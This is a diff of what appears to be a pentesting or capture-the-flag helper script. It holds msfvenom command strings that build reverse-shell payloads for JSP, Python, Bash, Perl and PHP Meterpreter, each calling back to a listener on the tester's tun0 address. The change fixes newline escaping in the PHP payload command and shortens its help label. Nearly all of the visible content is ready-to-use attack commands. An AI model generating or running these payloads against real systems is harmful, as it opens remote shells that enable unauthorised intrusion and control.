@@ -129,7 +129,7 @@ msfjava1_shell="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$tun0_ip LPORT=$por
 msfpython1_shell="msfvenom -p cmd/unix/reverse_python LHOST=$tun0_ip LPORT=$port -f raw > shell.py"
 msfbash1_shell="msfvenom -p cmd/unix/reverse_bash LHOST=$tun0_ip LPORT=$port -f raw > shell.sh"
 msfperl1_shell="msfvenom -p cmd/unix/reverse_perl LHOST=$tun0_ip LPORT=$port -f raw > shell.pl"
-msfphp1_shell="msfvenom -p php/meterpreter_reverse_tcp LHOST=$tun0_ip LPORT=$port -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php"
+msfphp1_shell="msfvenom -p php/meterpreter_reverse_tcp LHOST=$tun0_ip LPORT=$port -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php"
 
 # ---
 
@@ -206,7 +206,7 @@ msfjava1_text="msfjava1 (jsp) -> $msfjava1_shell"
 msfpython1_text="msfpy1 (unix python) -> $msfpython1_shell"
 msfbash1_text="msfbash1 (unix bash) -> $msfbash1_shell"
 msfperl1_text="msfpl1 (unix perl) -> $msfperl1_shell"
-msfphp1_text="msfph1 (php) -> $msfphp1_shell"
+msfphp1_text="msfph1 (php revshell with msfvenom)"
 
 
 # ---
